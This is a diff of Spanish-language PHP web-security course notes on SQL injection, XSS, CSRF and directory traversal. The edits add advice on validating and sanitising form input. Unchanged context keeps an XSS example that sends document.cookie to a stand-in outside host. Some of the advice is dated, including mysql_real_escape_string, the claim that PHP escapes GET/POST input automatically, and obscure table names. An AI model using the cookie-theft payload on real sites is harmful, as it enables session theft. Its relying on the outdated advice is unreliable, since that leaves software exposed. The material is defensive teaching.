@@ -80,7 +80,7 @@ El atacante no solo puede ejecutar un DELETE mediante este sencillo procedimient
 
 Para blindarse frente a inyecciones de SQL, se recomienda:
 
-* **Filtrar los datos procedentes de los formularios. SIEMPRE**. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc.
+* **Filtrar los datos procedentes de los formularios. SIEMPRE**. Por ejemplo, si los nombres de usuario sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como comillas, puntos y coma, asteriscos, almohadillas, etc. Vimos cómo se valida y se sanea un formulario en el tema anterior.
 * **Escapar los caracteres especiales** de cualquier dato de entrada antes de enviarlo al gestor de bases de datos. Por ejemplo, *mysql_real_escape_string()* coloca barras invertidas antes de ciertos caracteres. *addslashes()* hace algo parecido. Esto hace que ya no se ejecuten como sentencias SQL. En las versiones recientes de PHP, el escape de caracteres especiales se hace automáticamente con cualquier dato que llegue por GET o POST.
 * **Usar nombres poco habituales para las tablas** de la base de datos. Una estrategia frecuente es utilizar un identificador significativo (como *users* para la tabla de usuarios) y añadirle varios caracteres o números aleatorios (así, la tabla se convertiría en algo como *users_58283*). Ese sufijo aleatorio se suele almacenar en un archivo de configuración para que esté accesible para todos los scripts del programa. Esta técnica tan simple dificulta enormemente cualquier intento de acceso fraudulento a las tablas.
 
@@ -102,7 +102,7 @@ Otra cosa que suele hacerse con XSS es robar datos de las *cookies* del cliente,
 <script>document.location = 'https://otrositio.com?cookies=' + document.cookie</script>
 ```
 
-Para evitar los ataques XSS, la estrategia más útil, otra vez, es **filtrar todos los datos externos**. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: **nunca** te fíes de ningún dato que provenga de un formulario si no lo has filtrado antes y le has quitado todos los caracteres sospechosos.
+Para evitar los ataques XSS, la estrategia más útil, otra vez, es **filtrar y validar todos los datos externos**. El filtrado de datos es sencillo de hacer y te ahorrará mogollón de problemas. En resumen: **nunca** te fíes de ningún dato que provenga de un formulario si no lo has saneado antes y le has quitado todos los caracteres sospechosos.
 
 ### 3.4.4. CSRF o XSRF (cross site request forgery)
 
@@ -142,7 +142,7 @@ Si un atacante logra manipular la variable *$viewName* para asignarle, por ejemp
 Para evitar este tipo de ataques, algunas estrategias son:
 
 * **Tener un array de páginas y carpetas válidas**. Si un include trata de acceder a un recurso que no está en la lista, se sospechará de un ataque.
-* **Buscar caracteres sospechosos en los nombres de los archivos**. Si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".
+* **Buscar caracteres sospechosos en los nombres de los archivos**. Es decir, sanear los formularios. Por ejemplo, si la variable *$viewName* del ejemplo anterior incluye los caracteres "../", la cosa se pone fea. No en vano, el ataque Directory Transversal también se denomina "ataque punto punto barra".
 
 ### 3.4.6. RFI (remote file inclusion)
 
